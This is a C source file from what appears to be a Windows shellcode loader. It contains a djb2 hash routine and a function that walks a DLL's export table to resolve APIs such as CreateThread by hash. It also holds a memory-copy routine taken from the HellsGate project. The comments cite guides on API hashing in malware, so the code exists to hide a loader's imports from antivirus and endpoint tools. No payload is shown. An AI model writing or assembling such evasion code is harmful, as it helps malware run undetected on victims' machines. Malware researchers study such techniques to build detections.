#include <Windows.h>
// DEBUG_PRINT
#include "ShellCodeLoader.h"

// https://theartincode.stanis.me/008-djb2/
DWORD runtime_hash(unsigned char* str)
{
    DWORD hash = 5381;
    int c;

    while (c = *str++)
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

    return hash;
}

// Resolve API function by function hash. Generate the API hashes using create_api_hashes.py
// https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
LPVOID GetProcAddressByHash(HMODULE hModule, DWORD function_hash) {
    LPVOID proc = NULL;
    // Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + dosHeader->e_lfanew);

    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + exportDirectoryRVA);

    // Get RVAs to exported function related information
    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + imageExportDirectory->AddressOfNameOrdinals);

    // Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
    // If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
    for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
    {
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)hModule + functionNameRVA;
        char* functionName = (char*)functionNameVA;
        DWORD_PTR functionAddressRVA = 0;

        // Calculate hash for this exported function
        DWORD functionNameHash = runtime_hash(functionName);

        // If hash for CreateThread is found, resolve the function address
        if (functionNameHash == function_hash)
        {
            functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
            proc = (PDWORD)((DWORD_PTR)hModule + functionAddressRVA);
            DEBUG_PRINT("%s : 0x%x : %p\n", functionName, functionNameHash, proc);
            return proc;
        }
    }
    // fail
    if (proc == NULL) {
        DEBUG_PRINT("Failed to resolve function for hash %p!\n", function_hash);
    }
    return proc;
}


// stolen from: https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L198C1-L211C2
PVOID MoveMemoryReImpl(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}